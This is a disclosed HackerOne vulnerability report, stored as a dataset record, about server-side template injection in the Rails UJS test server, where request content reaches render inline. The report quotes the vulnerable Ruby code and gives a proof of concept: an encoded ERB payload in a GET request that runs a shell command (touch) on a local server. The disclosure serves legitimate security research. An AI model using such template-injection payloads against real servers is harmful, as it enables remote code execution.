---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '942103'
original_report_id: '942103'
title: Server-side template injection at ujs test server
weakness: Command Injection - Generic
team_handle: rails
created_at: '2020-07-25T05:56:19.394Z'
disclosed_at: '2021-02-16T13:22:47.812Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 4
asset_identifier: https://github.com/rails/rails
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- command-injection-generic
---

# Server-side template injection at ujs test server

## Metadata

- HackerOne Report ID: 942103
- Weakness: Command Injection - Generic
- Program: rails
- Disclosed At: 2021-02-16T13:22:47.812Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

I have found in the server code for testing ujs in Rails that template injection is possible and that leads to rce.


### code


https://github.com/rails/rails/blob/v6.0.3.2/actionview/test/ujs/server.rb

```ruby
module UJS
  class Server < Rails::Application
    routes.append do
      get "/rails-ujs.js" => Blade::Assets.environment
      get "/" => "tests#index"
      match "/echo" => "tests#echo", via: :all
      get "/error" => proc { |env| [403, {}, []] }
    end

...

class TestsController < ActionController::Base
  helper TestsHelper
  layout "application"

  def index
    render :index
  end

  def echo
    data = { params: params.to_unsafe_h }.update(request.env)

    if params[:content_type] && params[:content]
      render inline: params[:content], content_type: params[:content_type]    
```

`render inline: params[:content]` receives the request value directly and can be executed as ERB code as it is, so it becomes template injection. (https://guides.rubyonrails.org/layouts_and_rendering.)html#using-render-with-inline


### PoC

Prepare Server.

```
❯ git clone https://github.com/rails/rails.git
❯ cd rails/actionview

❯ git rev-parse HEAD
0fb6993f48bb01a960316027675f3f496baa2088

❯ bundle install
...

❯ rake ujs:server
Puma starting in single mode...
* Version 4.3.1 (ruby 2.7.1-p83), codename: Mysterious Traveller
* Min threads: 0, max threads: 16
* Environment: development
* Listening on tcp://127.0.0.1:4567
* Listening on tcp://[::1]:4567
Use Ctrl-C to stop
```

Prepare Attack code.

```js
encodeURIComponent("<% `touch me` %>")
> "%3C%25%20%60touch%20me%60%20%25%3E"
```

Open url

```
http://localhost:4567/echo?content_type=test&content=%3C%25%20%60touch%20me%60%20%25%3E
```

Access url with browser or curl

```
❯ ls me
me
```

## Impact

Since the attack code can be sent as a GET request, an attacker can attack a device running a test server for ujs from the external network by inducing a trap site.
However, since this is a server used for testing rails development, it does not seem to have a significant impact on users.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
